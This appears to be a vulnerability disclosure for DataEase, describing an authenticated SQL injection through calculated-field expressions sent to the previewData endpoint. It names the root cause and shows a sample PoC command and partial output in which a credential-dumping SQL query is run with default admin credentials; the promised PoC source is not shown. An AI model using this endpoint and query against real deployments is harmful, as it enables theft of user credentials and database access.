# DataEase: Authenticated SQL Injection (previewData)

## Summary

The endpoint `POST /de2api/datasetData/previewData` builds a SQL query from a dataset definition sent in the request. In specific, a field of type "calculated field" carries an expression which is placed into an SQL with no checks. As a result, any logged-in user can run arbitrary SQL against any configured datasource.

## Root cause

**Missing input validation:** The calculated-field expression is base64-decoded and then concatenated into the SQL by `Utils.buildCalcField`.

## Proof of concept

The PoC script (`PoC.py`, full source in the Appendix) automates the whole flow: it logs in, picks a datasource and table, and runs an arbitrary SQL query.

Sample run:

```
$ python3 PoC.py --url http://localhost:8100 --user admin --pass 'DataEase@123456' \
    --sql 'SELECT concat(account,0x3a,pwd) FROM per_user LIMIT 1'
[*] token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1 ...
[*] datasources found: Demo(985188400292302848)
[*] injecting via POST /de2api/datasetData/previewData
[*] payload SQL: SELECT concat(account,0x3a,pwd) FROM per_user LIMIT 1
[*] base table used: `area`
...
`dataease/dataease`, current `main`. Confirmed on official image v2.10.26. Re-verified still unfixed on the latest tag v3.0.0 and on the current `dev-v2` HEAD as of 2026-09-07.

## Appendix: PoC source (PoC.py)
Requires `requests` and `cryptography` (`pip install requests cryptography`). Save as `PoC.py` and run as shown above.
